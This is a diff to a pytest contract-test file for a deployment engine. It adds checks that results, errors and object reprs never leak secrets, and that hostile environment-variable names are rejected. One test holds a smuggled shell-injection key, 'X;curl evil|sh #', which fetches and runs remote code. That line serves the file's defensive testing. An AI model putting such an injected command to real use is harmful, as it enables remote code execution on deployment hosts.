@@ -14,16 +14,22 @@
 #   * no result DTO and no raised error ever carries secret material.
 #
 # Created 2026-07-21 (feat/ship-1-engine-contract): new module.
+# Updated 2026-07-21 (review fixes): logs contract test now runs the
+#   no-secret-material scan; added PORT-level guarantees (AppSpec rejects
+#   hostile env var names with InvalidSpec; AppSpec/DeployRequest repr never
+#   prints env values).
 
 from __future__ import annotations
 
 import pytest
 from pocketpaw_ee.ship_engine import (
+    AppSpec,
     BackupResult,
     CommandFailed,
     DbResult,
     DeployResult,
     DomainResult,
+    InvalidSpec,
     LogChunk,
     MetricsSnapshot,
     ShipEngine,
@@ -95,6 +101,7 @@ async def test_logs_returns_typed_result(engine_case: EngineCase) -> None:
     assert isinstance(result.lines, tuple)
     assert len(result.lines) >= 1
     assert all(isinstance(line, str) and line.strip() for line in result.lines)
+    assert_no_secret_material(result, engine_case.secret_markers)
 
 
 async def test_metrics_returns_typed_result(engine_case: EngineCase) -> None:
@@ -131,3 +138,23 @@ async def test_failed_command_maps_to_typed_error(engine_case: EngineCase) -> No
     assert_clean_text(str(exc), engine_case.secret_markers)
     assert_clean_text(exc.command, engine_case.secret_markers)
     assert_clean_text(exc.stderr_tail, engine_case.secret_markers)
+
+
+# --------------------------------------------------------------------- #
+# Port-level guarantees (engine-independent, no fixture needed)
+# --------------------------------------------------------------------- #
+
+
+def test_app_spec_rejects_hostile_env_keys() -> None:
+    # A shell-syntax key must die at the DTO boundary — long before any
+    # driver interpolates it into a remote command.
+    with pytest.raises(InvalidSpec):
+        AppSpec(name="demo", env={"X;curl evil|sh #": "v"})
+
+
+def test_app_spec_repr_never_prints_env_values() -> None:
+    # env is repr=False: a logged/debugged spec (or DeployRequest wrapping
+    # one) must not print secret values.
+    for marker in c.ENV.values():
+        assert marker not in repr(c.APP_SPEC)
+        assert marker not in repr(c.DEPLOY_REQUEST)
